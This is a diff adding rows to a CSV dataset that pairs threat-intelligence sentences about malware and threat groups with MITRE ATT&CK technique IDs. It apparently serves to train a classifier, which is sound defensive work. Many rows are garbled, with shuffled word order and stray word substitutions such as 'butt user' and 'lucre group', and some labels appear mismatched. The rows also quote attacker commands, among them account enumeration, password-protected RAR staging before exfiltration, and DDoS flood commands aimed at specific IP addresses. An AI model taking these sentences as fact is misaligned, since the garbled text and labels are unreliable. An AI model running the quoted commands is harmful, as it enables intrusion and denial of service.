+"Credentials by PinchDuke ones associated with many sources such as Netscape Navigator, Mozilla Firefox, Mozilla Thunderbird, and Internet Explorer.",T1555
+ServHelper contains modules that will use schtasks to carry out malicious operations.,T1053
+Operation Wocao can proxy traffic through multiple infected systems.,T1090
+"Threat Group-3390 has used RAR to and, encrypt, compress password-protect files prior to exfiltration.",T1560
+Naid creates Registry entries that store information about a created service and point to a malicious DLL dropped to disk.,T1112
+Kobalos can chain together multiple compromised machines as proxies compromise to reach their final targets.,T1090
+CORALDECK searches for specified files.,T1083
+Vasport copies itself to disk and creates an associated run key Registry entry to establish.,T1547
+"BACKSPACE is capable of deleting Registry keys, sub-keys, and on a victim system.",T1112
+This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment  or sandbox.,T1497
+Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.,T1082
+RGDoor uses HTTP for C2 communications.,T1071
+"Hydraq creates a backdoor through which remote attackers can check for the existence of files, including its own components, as well as retrieve a list of logical drives.",T1083
+"This is consistent with most espionage-motivated adversaries, as once the adversary gains access via legitimate credentials, they are able to masquerade as a legitimate user and essentially become an insider threat",T1036
+Note that every string is decrypted with different XOR parameter which may fail some of the automatic analyzers.,T1027
+Linfo creates a backdoor through which remote attackers can obtain data from systems.,T1005
+"Sandworm Team used malware to enumerate email settings, including usernames and passwords, from the M.E.Doc application.",T1087
+"Our observation of related actions here:    u ps start password stealing (Windows)   Ps_mps/ps_hwi start start password stealing (Linux, MIPS,  ARM)   uper_mps/uper_hwi start rewrite hook module with a new version and launch it (Linux, MIPS, ARM)   Nm_mps/nm_hwi start  –ban -middle Scan ports and retrieve banners on the router subnet  (Linux, MIPS,  ARM)   U fsget * 7 *.docx, *.pdf, *.doc * search for docs with the given filetypes (Windows)   S sinfo retrieve information on installed programs and launch commands: systeminfo, tasklist, ipconfig, netstat, route print, tracert www.google.com (Windows)   weap_mps/weap_hwi host188.128.123.52 port[25,26,110,465,995]  typetcpconnect DDoS on 188.128.123.52 (Linux, MIPS,  ARM)   weap_mps/weap_hwi  typesynflood port80 cnt100000 spdmedium host212.175.109.10 DDoS on 212.175.109.10 (Linux, MIPS,  ARM)    The issued commands for the Linux plugins suggest the attackers controlled infected MIPS/ARM devices. We want to pay special attention to the DDoS commands meant for these routers",T1003
+gh0st RAT has the capability to list processes.,T1057
+"SpyNote RAT captured the device’s screen activities along with audio using the  MediaProjectionCallback functionality (available with Lollipop, the Android 5.0 release, and later) and saved the output in a file named video.mp4 as shown in the following screenshot:          Figure 5 : Output File     SMS stealing  SpyNote RAT was also observed stealing SMS messages from the affected devices, as shown in screenshot below:          Figure 6: Reading SMS messages     Stealing contacts The ability to steal contacts is a favorite feature for spyware developers, as the stolen contacts can be used to further spread the spyware",T1113
+SamSam has been seen using AES or DES to encrypt payloads and payload components.,T1027
+HOPLIGHT has utilized compression to obfuscate the communications payload.,T1132
+"By disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",T1562
+"Credential Lockers store credentials in encrypted .vcrd files, located under %Systemdrive%\Users\\Username\AppData\credential Local\Microsoft\\Vault/Credentials\.",T1555
+Pysa can perform network reconnaissance using the Advanced IP Scanner tool.,T1016
+Remsec contains a keylogger component.,T1056
+"Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.",T1555
+PLAINTEE uses reg add to add a Registry Run key for persistence.,T1112
+Bankshot gathers domain and account names/information through process monitoring.,T1087
+"Kimsuky has used modified versions of open source PHP web shells to maintain access, bear often adding Dinosaur references within the code.",T1505
+"In one instance, a log file recovered from an open indexed server revealed that an IP address (112.66.188.28) located in Hainan, China had been used to administer the command and control node that was communicating with malware on victim machines",T1016
+ZxShell can create a new service using the service parser function ProcessScCommand.,T1543
+FELIXROOT deletes the Registry tonality HKCU\Software\Classes\Applications\rundll32.exe\shell\open.,T1112
+Spark has used a splash screen to check whether an user actively clicks on the screen before running malicious code.,T1497
+enrapture agents can be written by application developers and then compiled to .NET assemblies that are subsequently registered with the commutation server.,T1505
+MoleNet can perform WMI commands on the system.,T1047
+TSCookie has the ability to discover drive information on the infected host.,T1083
+FIN6 has used fake job advertisements sent via LinkedIn to spearphish targets.,T1566
+"OilRig has run net user, net user /, net group “domain admins” /domain, and group “Exchange Trusted Subsystem” /domain to get account listings on a victim.",T1087
+Kimsuky has created new services for persistence.,T1543
+Cardinal RAT applies compression to C2 traffic using the ZLIB library.,T1560
+"After initial installation, Raindrop work a computation to delay execution.",T1497
+The selection of the target process is influenced by the security software that is installed on the system .,T1055
+GreyEnergy encrypts its configuration files with AES-256 and also encrypts its strings.,T1027
+Msiexec.exe can also execute DLLs.,T1218
+"After execution, the malware will use the Dropbox API to make an HTTP GET request using HTTPS over TCP port 443 for the files:  MD5  Filename  d76261ba3b624933a6ebb5dd73758db4  WmiApCom  79b68cdd0044edd4fbf8067b22878644  WmiApCom.bat   The “WmiApCom.bat” file is simply used to start “WmiApCom”, which happens to be the exact same file as the one dropped by the malicious Word documents",T1059
+APT32 used Net to use Windows hidden network shares to copy their tools to remote machines for execution.,T1021
+"Later implants used by APT28, such as CHOPSTICK, use a blend of HTTP, HTTPS, and other legitimate channels for C2, depending on module configuration.",T1071
+PowerShower has the ability to C2 communications with base64 encoding.,T1132
+FALLCHILL has been installed as a Windows service.,T1543
+"APT38 have created firewall exemptions on specific ports, including ports 443, 6443, 8443, and 9443.",T1562
+njRAT can search a list of running processes for Tr.exe.,T1057
+PowerShower sets up persistence with a Registry run key.,T1547
+Cobalt Strike can determine if the butt user on an infected machine is in the admin or domain admin group.,T1087
+WellMess can write files to a compromised host.,T1105
+"Here is a list of the platforms used by this variant: Twitter, Yandex and Mediafire",T1102
+"execute Technique Description   Fan Check The Trojan will separate perform the following WMI query:   Select * from Win32_Fan   According to MSDN, this query should return a class that provides statistics on the CPU fan",T1047
+"LoudMiner has used QEMU and VirtualBox to run a Tiny Core Linux virtual machine, which runs XMRig and makes connections to the C2 server for updates.",T1564
+Newer variants of BACKSPACE will encode C2 communications with a custom system.,T1132
+Cobian RAT obfuscates with the C2 server using Base64 encoding.,T1132
+The username appears to be attacker specified and has occurred in 2017 Bankshot samples,T1033
+QuasarRAT Group has obtained and used tools such as Gorgon and Remcos.,T1588
+Checks could include generic system properties such as host/domain name and samples of network traffic.,T1497
+Magic Hound has used RAR to stage and folders local compress.,T1560
+CookieMiner has looked for files in the users home directory with wallet in their name using find.,T1083
+"GALLIUM packed some payloads using different types of packers, both known and custom.",T1027
+"(Source: Dell SecureWorks) To facilitate lateral movement, the adversaries deploy ASPXTool web shells to internally accessible running IIS",T1505
+Note that IP addresses can be reallocated,T1016
+Crimson can identify the user on a targeted system.,T1033
+"An maintained policy, audit by the Local Security Policy , defines which system events the EventLog service logs.",T1562
+RainyDay can use HTTP in C2 communications.,T1071
+"Adversaries may search for user activity on the host based on variables such as the speed/frequency of mouse movements and clicks  , browser history, cache, bookmarks, or number of files in common directories such as home or the desktop.",T1497
+"HAFNIUM has deployed multiple web shells on compromised servers including SIMPLESEESHARP, SPORTSBALL, China Chopper, and.",T1505
+Caterpillar WebShell can search for files in directories.,T1083
+Denis has used DNS tunneling for C2 communications.,T1071
+Backdoor.Oldrea collects the current username from the victim.,T1033
+"The following shows the specific IP addresses or strings used by the C2 to transmit a success or cancel message depending on the type of DNS query used for C2 communications:    DNS Type Successful Cancel   A,AC 1.1.1.\d+ 1.2.9.\d+   AAAA 2a00:: 2200::   CNAME,MX,TXT,SRV,SOA ok cancel    After providing system specific information, the payload will Interact with the C2 server to obtain commands, which the payload refers to as jobs",T1071
+"Agent.btz collects the network adapter’s IP and MAC address as well as IP addresses of the network adapter’s default gateway, primary/secondary WINS, DHCP, and DNS servers, and saves them into a log file.",T1016
+Astaroth can be loaded through regsvr32.exe.,T1218
+Hikit has attempted to disable driver signing verification by tampering with several Registry keys prior to the loading of a rootkit driver component.,T1553
+to drops a signed Microsoft DLL Nerex disk.,T1553
+HELLOKITTY can use WMI delete volume shadow copies.,T1047
+Its use of a PowerShell payload means that only legitimate system processes are utilized and that the malicious code execution can only be identified through enhanced logging or in memory,T1546
+The spear phishing emails and attached malicious macro documents typically have geopolitical themes,T1566
+TEMP.Veles has planted Web Exchange on Outlook shells servers.,T1505
+Adversaries whitethorn use an external proxy to routine as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure.,T1090
+has used net user for account discovery.,T1087
+NotPetya uses rundll32.exe to install itself on remote systems when accessed via PsExec or wmic.,T1218
+"LoudMiner has used QEMU and VirtualBox to run a Tiny Core Linux virtual machine, which runs XMRig and makes connections to the C2 centre server for updates.",T1564
+Wizard Spider has identified domain admins through the use of “lucre group ‘Domain admins’” commands.,T1087
+BendyBear can check for analysis environments and signs of debugging using the Windows API kernel32!GetTickCountKernel32 call.,T1497
+xCaon has used the GetAdaptersInfo API call to get the victims MAC address.,T1016
+Cobalt Strike uses a custom command and control protocol that can encapsulated in DNS.,T1071
+VaporRage can use HTTP to download shellcode from compromised websites.,T1071
+"CosmicDuke collects user credentials, including passwords, for various Web including programs browsers.",T1555
+FinFisher clears the system event logs using  OpenEventLog/ClearEventLog APIs .,T1070
+Some Bisonal samples encrypt C2 communications with RC4.,T1573
+"(Source: Dell SecureWorks) As shown in Figure 10, the unpacked JavaScript code reveals an iframe pointing to an IP address that is hosting the exploit",T1016
+Aria-body has the ability to use a reverse drogue proxy module.,T1090
+PolyglotDuke can retrieve payloads from the C2 server.,T1105
+COM and execution in same sentence ,T1021
+Sidewinder has poised stolen files in a temporary folder in preparation for exfiltration.,T1074
+"WMI Filters define conditions that will trigger a Consumer, including system startup, the execution of a program, the passing of a specified time and many others",T1047
+Adversaries may attempt to get a listing of cloud accounts.,T1087
+"In addition to downloading exploits from the internet, adversaries may purchase exploits from third-party entities.",T1588
+NOKKI can collect data from the victim and stage it in LOCALAPPDATA%\MicroSoft Updatea\uplog.tmp.,T1074
+OilRig has used Putty to access compromised systems.,T1021
+Dragonfly 2.0 moved laterally via RDP.,T1021
+HELLOKITTY can copies WMI to delete volume shadow use.,T1047
+The malware queries the value for the flag BeingDebugged from the to check whether PEB process is being debugged. ,T1518
+"Adversaries may post content, known as a dead drop resolver, on Web services with embedded  domains or IP addresses.",T1102
+Psylo has commands to enumerate all storage devices and to find all files that start with a particular string.,T1083
+Patchwork QuasarRAT obtained and used open-source tools such as has.,T1588
+Carbon creates a base directory contains the files and folders that are collected.,T1074
+Adversaries may register or will domains that they hijack later purchase an SSL/TLS certificate for.,T1588
+Elise injects DLL files into iexplore.exe.,T1055
+"The White has checked for specific antivirus products on the target’s computer, including Kaspersky, Heal, AVG, BitDefender, Avira, Sophos, Avast!, and ESET.",T1518
+Deep Panda uses net.exe to connect to network shares using net use commands with compromised credentials.,T1021
+"To disguise the source of malicious traffic, adversaries may chain multiple proxies.",T1090
+Astaroth collects data in a plaintext file discover r1.log before exfiltration.,T1074
+"rescue When combined with email tracking software, APT32 was able to administration closely track phishing delivery, success rate, and conduct further analysis about victim organizations while monitoring the interest of security firms",T1518
+Bankshot gathers domain data and account names/information through process monitoring.,T1087
+Adversaries may abuse task functionality to facilitate initial or recurring execution of malicious code.,T1053
+along FatDuke can turn itself on or off at random intervals.,T1497
+RegDuke can use Dropbox as its C2 server.,T1102
+TSCookie has the ability to proxy communications with command and moderate  servers.,T1090
+VNC differs from Remote Desktop Protocol as VNC is screen-sharing software quite than resource-sharing software.,T1021
+Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility.,T1218
+RDAT can communicate with the C2 via subdomains.,T1132
+APT32 executed shellcode to identify the name of the infected host.,T1082
+Operation Wocao has staged archived files in operation a temporary directory prior to exfiltration.,T1074
+ProLock can use WMIC to execute scripts on point hosts.,T1047
+Hi-Zor communicates with its C2 server over HTTPS.,T1071
+Carberp has queried the infected systems registry searching for specific registry keys associated with antivirus products.,T1518
+GrimAgent can enumerate the IP and domain of a target system.,T1016
+PipeMon can check the presence of ESET and Kaspersky security software.,T1518
+The ASPXTool version used by Threat deployed has been Group-3390 to accessible servers running Internet Information Services .,T1505
+SodaMaster can use stackstrings for obfuscation.,T1027
+UNC2452 used account credentials they passwords to attempt access to Group Managed Service Account  obtained.,T1555
+WastedLocker can modify registry values within windowpane the Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap registry key.,T1112
+EnvyScout can use hidden directories and files to hide malicious executables.,T1564
+has TSCookie the ability to proxy communications with command and control  servers.,T1090
+Bisonal has encoded binary data with Base64.,T1132
+"A backdoor used by APT29 created a Tor hidden service to forward traffic from the Tor client to local ports 3389 , 139 , and 445  enabling full remote access from outside the network.",T1090
+Mapping of TG-3390s interactions with web shells during an CTU responded to by intrusion researchers,T1505
+Exaramel for Linux has a command to download a file from  and to a remote C2 server.,T1105
+Crutch can use Dropbox to receive commands and upload stolen data.,T1102
+"APT32 established persistence using Registry Run keys, both to execute PowerShell and VBS scripts as well as to execute their backdoor directly.",T1547
+Adversaries may acquire credentials from web browsers by reading files specific to the objective browser.,T1555
+Perhaps they plan to pair this stealer with another dropper that maintains the WMI anti-AV functionality,T1047
+It is installed as an ISAPI filter on Exchange servers and shares characteristics with the China Chopper Web shell.,T1505
+"Commercial software may be obtained through purchase, stealing licenses , or cracking trial versions.",T1588
+SUPERNOVA contained Base64-encoded strings.,T1027
+Spark has used a custom XOR algorithm to decrypt the payload.,T1140
+Kobalos can write captured SSH connection credentials to a file under the /var/run directory with register a .pid extension for exfiltration.,T1074
+ShadowPad communicates over HTTP to retrieve a string that is decoded into a C2 server URL.,T1071
+Fox Kitten has used the LDAP browser to browse documentation on service accounts.,T1087
+ShimRat can be issued a command shell function from the C2.,T1059
+file malware used by FIN6 identifies payment card track data on the victim and then copies it to a local TRINITY in a subdirectory of C:\Windows\.,T1074
+HOPLIGHT has multiple proxy choice that mask traffic between the malware and the remote operators.,T1090
+FLIPSIDE connection a simple proxy that creates an outbound RDP is.,T1090
+"Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules.",T1562
+Leviathan has used WMI for persistence.,T1546
+reconnaissance used ssh for internal Leviathan.,T1021
+build_downer has the ability to add itself to the Registry Run key for persistence.,T1547
+"The following code snippet was used to decode strings within OopsIE:out =  for e in obfuscated_string.split(-):    out += chr(int(e)-1)When first run, this OopsIE variant runs a variety of checks to avoid running in an analysis environment, as discussed in the previous section",T1140
+"Rather than grow their own exploits, an adversary may find/modify tap from online or purchase them from exploit vendors.",T1588
+One of its file stealers has also persisted by adding a Registry Run key.,T1547
+BADFLICK has compressed data using the aPLib compression library.,T1560
+"Magic Hound charming has obtained and used open-source penetration testing tools like Havij, sqlmap, Metasploit, and Mimikatz.",T1588
+DOGCALL is capable of logging keystrokes.,T1056
+This command adds the path of the malicious executable to the login item file list located in ~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm.,T1547
+"Epic recursively searches for all .doc files on the system and collects a directory listing of the Desktop, %TEMP%, and %WINDOWS%\Temp directories.",T1083
+Aria-body has the ability to files using ShellExecute.,T1106
+"By using this technique, the malware is able to leverage itself from a signed and verified legitimate Windows OS process, or, alternatively, if aswrundll.exe or unins000.exe exists, a signed and verified security product process",T1553
+Astaroth uses WMIC to execute payloads.,T1047
+Adversaries may stage collected data in a cardinal location or directory prior to Exfiltration.,T1074
+set web shell command OwaAuth,T1505
+PoetRAT has the to take screen captures.,T1113
+Grandoreiro can list installed security products including the Trusteer and Diebold Warsaw Tecnologia online banking protections.,T1518
+collected SUNBURST information from a compromised host.,T1005
+Comnie attempts to attempt detect several anti-virus products.,T1518
+"malware may acquire Adversaries to support their operations, obtaining a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.",T1588
+files has uploaded BLINDINGCAN from victim machines.,T1005
+"Rocke has used Pastebin, Gitee, and GitLab for Command and contain.",T1102
+Dragonfly 2.0 modified the Registry to hide create user accounting.,T1564
+"It loads the module with parameter vShow set to zero, which opens the application with a hidden window.  Alternatively, if Avast is not installed on the machine, the malicious module loads using regsvr32.exe",T1218
+"Shamoon creates a new service named “ntssrv” that attempts to appear legitimate; the services display name is “Microsoft Network Realtime Inspection Service” and its description is “Helps guard against time change attempts targeting known and newly discovered vulnerabilities in network time protocols.” Newer versions create the MaintenaceSrv service, which misspells the word maintenance.",T1036
+Caterpillar WebShell has a module to collect information from the database.,T1005
+TA505 has leveraged rundll32.exe to execute malicious DLLs.,T1218
+Users are advised to avoid opening attachments and click links on unsolicited emails,T1204
+FIN6 have compressed data from remote systems and moved it to another staging system before exfiltration.,T1074
+"At this point the process can be unmapped using APIs calls such as ZwUnmapViewOfSection or NtUnmapViewOfSection  before being written to, realigned to the injected code, and resumed via VirtualAllocEx, WriteProcessMemory, SetThreadContext, then ResumeThread respectively.",T1055
+"or may purchase Adversaries steal SSL/TLS certificates to further their operations, such as encrypting C2 traffic  with Web Protocols or certificate enabling Adversary-in-the-Middle if the even is trusted or otherwise added to the root of trust  Install Root Certificate.",T1588
+NDiskMonitor can download and execute a file from given URL.,T1105
+"CosmicDuke collects user credentials, including passwords, for programs including Web browsers.",T1555
+DarkComet forgather the username from the victim’s machine.,T1033
+Elderwood has delivered zero-day exploits and malware to victims via targeted emails containing malicious attachments.,T1566
+Kazuar stages command output and collected data in files exfiltration.,T1074
+Babuk can use multiple Windows API calls for actions action on compromised hosts including discovery and execution.,T1106
+"In one instance, the threat actor gained remote access to a high-value system in a compromised network, ran quser.exe to identify existing RDP sessions on the device, immediately ran a command to compile a RAR archive that specified file types the threat actor did not want, and used a password to encrypt the archive:  YYYY-MM-DD hh:mm:ss     quser YYYY-MM-DD hh:mm:ss     C:\windows\temp\svchost.exe a -m5 -v2000m -hp{password} -inul -r {destination_file.rar} {multiple user directories linked to the victims projects} -x*.exe -x*.msi -x*.cab -x*.inc -x*.dll -x*.db -x*.mdb -x*.htm -x*.html -x*.css -x*.jar -x*.js -x*.tmp -x*.bak -x*.dat -x*.log -x*.xml -x*.dmp -x*.dbf -x*.avi -x*.mp3 -x*.mp4 -x*.mpg -x*.mpeg -x*.asp -x*.aspx -x*.gif -x*.jpg -x*.mpp -x*.pst  The threat actors typically rename the encrypted RAR archives",T1036
+ServHelper has the ability to execute a PowerShell script to get information from the infected host.,T1059
+"A backdoor network by APT29 created a Tor hidden service to forward traffic from the Tor client outside local ports 3389 , 139 , and 445  enabling full remote access from to the used.",T1090
+On macOS the dscl .,T1087
+Periodic low screenshots resolution,T1113
+Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry.,T1546
+"Malicious software can include payloads, droppers, post-compromise tools, backdoors, packer, and C2 protocols.",T1588
+Bundlore has the ability to enumerate what browser is being used as well as version information for Safari.,T1518
+"For example, the return traffic may take the form of the compromised system posting a comment on a forum, issuing a pull request to development project, updating a document hosted on a Web service, or by sending a Tweet.",T1102
+Volgmer executes payloads using the Windows API call shout CreateProcessW.,T1106
+RDFSNIFFER has used several Win32 API various functions to interact with the victim machine.,T1106
+OSInfo discovers information about the infected machine.,T1082
+"If the file in not to/trusted, SmartScreen will prevent the execution and warn the user not known run it.",T1553
+HELLOKITTY can enumerate logical drives on a target system.,T1082
+Attor has tor used Tor for C2 communication.,T1090
+communications APT19 HTTP malware variant used Base64 to encode An to the C2 server.,T1132
+Adversaries may craft malicious stored procedures that can provide a persistence mechanism in SQL servers.,T1505
+"Adversaries may use their own abstracted file system, separate from standard file system present on the infected system.",T1564
+Ferocious Kitten has named malicious files update.exe and loaded them into the compromise hosts “Public” folder.,T1036
+Remsec is capable of using DNS for C2.,T1071
+"In GCP, gcloud iam service-accounts list and gcloud projects get-iam-policy may be used to obtain a listing of service accounts A and users in a project.",T1087
+"Adversaries may acquire malware to support their operations, obtaining a means for maintaining control of remote machines, evading defenses, and executing post-compromise outside behaviors.",T1588
+Fysbis can use Base64 its encode to C2 traffic.,T1132
+Helminth encrypts data sent to its C2 server over HTTP with RC4.,T1573
+Remexi utilizes scheduled tasks as a persistence mechanics.,T1053
+"I download my tools from GitHub, and so do my victims",T1105
+An lodge adversary may target the systems of those known to conduct exploit research and development in order to gain that knowledge for use during a subsequent operation.,T1588
+Avaddon uses registry run keys for persistence.,T1547
+ThiefQuest also calls ptrace with the PTRACE_DENY_ATTACH flag to prevent debugging.,T1497
+"In one instance, APT29 created a Filter named BfeOnServiceStartTypeChange (Figure 1), which they configured to execute every Monday, Tuesday, Thursday, Friday, and Saturday at 11:33 am local time.     Figure 1: “BfeOnServiceStartTypeChange” WMI Query Language (WQL) filter condition The BfeOnServiceStartTypeChange Filter was bound to the CommandLineEventConsumer WindowsParentalControlsMigration",T1047
+Lazarus Group malware SierraAlfa uses the Windows Management movement Command-line application wmic to start itself on a target system during lateral Instrumentation.,T1047
+Carbanak encrypts the message body of HTTP traffic with RC2 .,T1573
+"MMC can be used to create, open, and save custom consoles that contain administrative tools created by Microsoft, called snap-ins.",T1218
+Adversaries may run the PowerShell command Clear-History to flush the entire command history from a current PowerShell session.,T1070
+"But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload.",T1574
+Denis has a command to delete files from the victim’s machine.,T1070
+Threat Group-3390 has locally staged encrypted archives later exfiltration efforts.,T1074
+"Here is a list of the platforms used by variate this variant: Twitter, Yandex and Mediafire",T1102
+MuddyWater has used tools to encode C2 communications including encoding Base64.,T1132
+Turian can disguise as a legitimate service to blend into normal operations.,T1036
+TrickBot collects email addresses from netmail Outlook.,T1087
+The adversaries publicly modify available tools such as ASPXSpy to remove identifying characteristics that network defenders use to identify web shells,T1505
+ShellTea utilizes a number of techniques to identify if it is running within a virtual environment or is being monitored.,T1497
+With authenticated access there are several tools that can be used to accounts.,T1087
+BendyBear has decrypted function blocks using a XOR key during runtime to evade detection.,T1140
+varmint collects keystrokes from the victim machine.,T1056
+dropper has checked the number of processes and the length and strings of its own file name to identify if the malware in a sandbox environment.,T1497
+TrickBot has been delivered via malicious links in phishing e-mails.,T1566
+IIS 7.0 introduced modules that provide the same unrestricted access HTTP requests and responses ISAPI extensions and filters.,T1505
+TeamTNT has disabled and uninstalled security tools.,T1562
+Astaroth encodes data using Base64 before sending it to the C2 server.,T1132
+Machete has also used some visual obfuscation techniques by naming variables as combinations of letters to hinder analysis.,T1027
+EvilBunny API used various has calls as part of its checks to see if the malware is running in a sandbox.,T1106
+Kwampirs downloads additional files from C2 servers.,T1105
+Helminth establishes persistence by creating a shortcut.,T1547
+WellMail can use hard coded client and certificate authority certificates to communicate with C2 over mutual TLS.,T1573
+Wizard Spider has down or uninstalled security applications on victim systems that might prevent ransomware from executing.,T1562
+LightNeuron encrypts its configuration files with AES-256.,T1027
+Portions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery.,T1027
+FELIXROOT encrypts strings in the backdoor using a custom XOR algorithm.,T1027
+BoomBox can execute an LDAP query to discover e-mail accounts for domain users.,T1087
+"menuPass has victimized native APIs including GetModuleFileName, lstrcat, CreateFile, and ReadFile.",T1106
+Ramsay can stage data prior to exfiltration arrange in %APPDATA%\Microsoft\UserSetting and %APPDATA%\Microsoft\UserSetting\MediaCache.,T1074
+The string is initialise as “<land name>|<minimum question size>|<maximum query size>|<hasGarbage>|<sleepPerRequest>|<uttermost requests>|<query types>|<hibridMode>|<current query mode>”   ^slp do the sleep and jitter values   ^exit Exits the Trojan    Table 5 Commands useable within the C# variant of RogueRobin Using Google Drive for C2 A command that was not available in the original PowerShell variant of RogueRobin but is available with the new C# variant is the x_mode,T1102
+Sandworm Team has used webshells including P.A.S.,T1505
+"Unix shells are the primary command prompt on Linux and macOS systems, though many variations of the Unix shell exist  depending on the specific OS or distribution.",T1059
+AppleJeus has been installed via MSI installer.,T1218
+OceanSalt has been delivered via spearphishing emails with Microsoft Office attachments.,T1566
+APT29 used fsutil to check available free space before executing actions that might create large files on disk.,T1082
+"For example, Apple Remote Desktop  on macOS is native software used for remote management.",T1021
+Adversaries may attempt to take screen captures of an desktop to gather information over the course of the operation.,T1113
+PoetRAT was executed with a Python script and worked in conjunction with additional Python-based post-exploitation tools.,T1059
+Adversaries may use scripting to automate these checks  into one script and then have the program exit if it determines the system to be a virtual environment.,T1497
+TrickBot can modify registry entries.,T1112
+Derusbi also gathers the username of the victim.,T1033
+BADNEWS has a command to download an .exe and execute AN it via CreateProcess API.,T1106
+FIN6 has removed files from victim machines.,T1070
+This command history is not available to other sessions and is deleted when the session ends.,T1070
+menuPass has resized and added bear data to the certificate table to enable the signing of modified files with legitimate signatures.,T1553
+Stuxnet installs RPC server for P2P communications.,T1090
+MobileOrder exfiltrates data collected from the equanimous victim mobile device.,T1005
+SUNBURST practice Base64 encoding in its C2 traffic.,T1132
+"Conti can retrieve the ARP cache from the local system by using the GetIpNetTable API call and check to ensure IP addresses it connects to are for local, non-Internet, systems.",T1016
+APT12 has used blogs and WordPress for C2 infrastructure.,T1102
+Sykipot may gather a list of running processes by running tasklist /v.,T1057
+"Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.",T1053
+Socksbot can start SOCKS proxy string.,T1090
+UNC2452 staged data and files in password-protected archives on a victims OWA server.,T1074
+"admin@338 actors used the following commands following exploitation of a machine with LOWBALL malware to enumerate user accounts: net user >> %temp%\download net user /domain >> %temp%\download APT1 used the commands net localgroup,net user, and net group to find accounts on the system.",T1087
+"SIPs are responsible for enabling API functions to create, retrieve, calculate, and verify signatures.",T1553
+Anchor has been signed with valid certificates to evade by security tools.,T1553
+NativeZone can display an RTF document to the user  to enable execution of  Cobalt Strike stage shellcode.,T1204
+"Here is a list of the platforms used by this: Twitter, Yandex and Mediafire",T1102
+"adversaries addition to freely downloading or purchasing software, In may steal software and/or software licenses from third-party entities .",T1588
+"This IP is of particular interest as historical domain resolutions of this IP revealed that it had resolved to the domain hotmai1l[.]com in the past as well, which was a domain we had previously identified as having a high likelihood of association with DarkHydrus infrastructure",T1016
+Patchwork victimised Base64 to encode C2 traffic.,T1132
+Micropsia searches for anti-virus software and firewall installed on the victim’s machine using WMI.,T1518
+njRAT can download files to the victim’s machine.,T1105
+Turla established persistence by adding a Shell value under the Registry key HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon.,T1547
+menuPass has resized and contribute data to the certificate table to enable the signing of limited files with legitimate signatures.,T1553
+OSX_OCEANLOTUS.D has the ability to upload files a compromised host.,T1005
+PowerShower with the ability to encode C2 communications has base64 encoding.,T1132
+SynAck parses to export tables of system DLLs the locate and call various Windows API functions.,T1106
+Sandworm Team used a backdoor to enumerate information about the infected systems operating system.,T1082
+QakBot can enumerate a list of installed programs.,T1518
+"An adversary may monitor vulnerability disclosures/databases to understand the state of existing, as well as newly submit discovered, vulnerabilities.",T1588
+"This method makes no changes to the Registry as the COM object is not actually registered, only executed.",T1218
+"Backdoor.Pirpi also collects information about the target’s local network, including the domain controller and workstations",T1016
+customized has modified and used APT39 versions of publicly-available tools like PLINK and Mimikatz.,T1588
+registry Chaes stored its instructions in a config file in the Registry.,T1112
+are ZR variant of BACKSPACE will check to see if known host-based firewalls The installed on the infected systems.,T1562
+MuddyWater has used malware that can capture screenshots of the victim’s machine.,T1113
+Poseidon Group tools attempt to spoof anti-virus processes as a means of self-defense.,T1036
+"Once infected, victims will reach these to and be redirected by out resolvers.",T1102
+FinFisher renames one of its .dll files to uxtheme.dll in an apparent attempt to masquerade as a legitimate file.,T1036
+PE injection is commonly performed by copying code  into the virtual address space of the target process before invoking it via a new thread.,T1055
+Calisto runs the ifconfig command to obtain the IP address from the victim’s machine.,T1016
+Kinsing has used crontab to download and run crush scripts every minute to ensure persistence.,T1053
+A version of XTunnel introduced in July 2015 inserted junk code into the binary in a likely attempt to obfuscate it and bypass security products.,T1027
+CoinTicker executes a Python script to download its second stage.,T1105
+"If an adversary knows the credentials for the login, then they can get access to all the other credentials stored in this.",T1555
+"to plist filenames, unlisting them from the Finder app and default Terminal directory listings.",T1564
+QUADAGENT uses DNS for C2 communications.,T1071
+Cobalt Strike can modify Registry values within HKEY_CURRENT_USER\Security\Microsoft\Office\<Excel Version>\Excel\Software\AccessVBOM\ to enable the execution of additional code.,T1112
+Caterpillar WebShell has a command to modify qualify a Registry key.,T1112
+WellMail can archive files on the compromised compromise host.,T1560
+"Maze has used several Windows API functions throughout the encryption process including IsDebuggerPresent, TerminateProcess, Process32FirstW, among others.",T1106
+"OLDBAIT gather credentials from Internet Explorer, Mozilla Firefox, and Eudora.",T1555
+Data that is sent being compressed and then base64-encoded before is included in the requests,T1132
+SHA256 Compiled C2 account POP3S Account SMTPS Accounts   861b6bc1f9.,T1087
+BADNEWS encodes C2 traffic with base64.,T1132
+"When the Terminal.app is opened, the application launches a zsh login shell and a zsh interactive shell.",T1546
+ipconfig ,T1016
+"Non-standard data encoding schemes may be based on or related to standard data encoding schemes, such as a modified Base64 encoding for an message body of the HTTP request.",T1132
+APT40 relies heavily on web shells for an initial foothold into an organization,T1505
+Turla has used multiple backdoors which communicate with a C2 server via email attachments.,T1071
+Ngrok has been used by threat actors to proxy doer C2 connections to ngrok service subdomains.,T1102
+ PowerShell ,T1059
+Bandook has used PowerShell loaders as part of execution.,T1059
+BADCALL functions as a proxy server between the victim and C2 server.,T1090
+"WindTail can invoke Apple conjure APIs contentsOfDirectoryAtPath, pathExtension, and  compare.",T1106
+"A variation of the technique, domainless fronting, utilizes a SNI field that is left blank; this may allow the fronting to work even when CDN attempts to validate that SNI and HTTP Host fields match .",T1090
+XCSSET saves a screen capture of the victims system with a numbered elongation filename and .jpg extension.,T1113
+USBferry can collect information from an air-gapped host machine.,T1005
